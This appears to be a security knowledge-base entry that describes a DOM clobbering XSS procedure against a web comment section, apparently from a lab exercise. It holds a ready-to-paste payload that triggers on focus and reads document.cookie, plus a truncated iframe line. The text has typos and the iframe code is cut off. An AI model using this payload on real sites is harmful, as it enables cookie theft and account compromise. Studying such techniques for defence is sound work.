---
id: 8c236b92-127a-4847-95f2-52644eb7959f
name: Clobbering DOM Attributes To Bypass HTML Filters
type: procedure
verified: true
submitted: true
created_at: '2020-08-31T04:39:00.100464+00:00'
updated_at: '2023-05-26T01:29:06.260372+00:00'
platforms:
- Web
tags:
- '[[DOM XSS]]'
- '[[injection]]'
- '[[owasp]]'
- '[[owasp top 10]]'
- '[[Web Applications]]'
---

# Clobbering DOM Attributes To Bypass HTML Filters

**Status**: ✓ Verified

## Summary

Description DOM Clobbering defiens the techniwue wherein HTML is injected into the page to manipulate DOM. Instructions 1. Paste the following payload in the comment section of the application. <form id=x tabindex=0 onfocus=alert(document.cookie)><input id=attributes> 

## Description

Description

DOM Clobbering defiens the techniwue wherein HTML is injected into the page to manipulate DOM.

Instructions

1. Paste the following payload in the comment section of the application.

*<form id=x tabindex=0 onfocus=alert(document.cookie)><input id=attributes>*

2.Submit the comment .

3. Save the following code with .html extension. 

**Code**: [[<iframe src=https://ac301f571f57bb498033200f00cb00]]

4. The iframe is loaded with a time delay of 500ms and it adds the x fragment element to the end of url. The x fragment id is defined in step 1.The delay is essential to load the comment section which contains the payload . It gets executed before JS is executed.

## Platforms

- Web

## Tags

- [[DOM XSS]]
- [[injection]]
- [[owasp]]
- [[owasp top 10]]
- [[Web Applications]]
